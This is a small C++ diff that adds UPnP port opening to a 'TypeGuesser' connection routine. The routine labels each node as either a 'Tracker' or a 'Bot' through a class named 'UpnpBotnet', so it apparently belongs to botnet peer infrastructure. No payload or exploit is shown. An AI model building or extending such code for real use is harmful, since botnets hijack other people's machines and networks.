@@ -1,4 +1,5 @@
 #include "TypeGuesser.hpp"
+#include "upnp.hpp"
 #include <asio/read.hpp>
 #include <asio.hpp>
 #include <asio/write.hpp>
@@ -47,6 +48,8 @@ void TypeGuesser::connect(const std::string &ip)
 {
     asio::ip::tcp::endpoint endpoint(asio::ip::address::from_string(ip), 9570);
     asio::error_code ec;
+    // wlan0 = Temporary (need getInterface())
+    UpnpBotnet Upnp("wlan0");
 
     _socket.connect(endpoint, ec);
     if (ec) {
@@ -65,9 +68,11 @@ void TypeGuesser::connect(const std::string &ip)
         throw ConnectionException(ec.message());
     }
     try {
+        UpnpOpenPort(&Upnp);
         server();
         _type = Type::Tracker;
     } catch (std::exception &e) {
+        Upnp.ClosePortAndFinishUpnp();
         _type = Type::Bot;
     }
 }
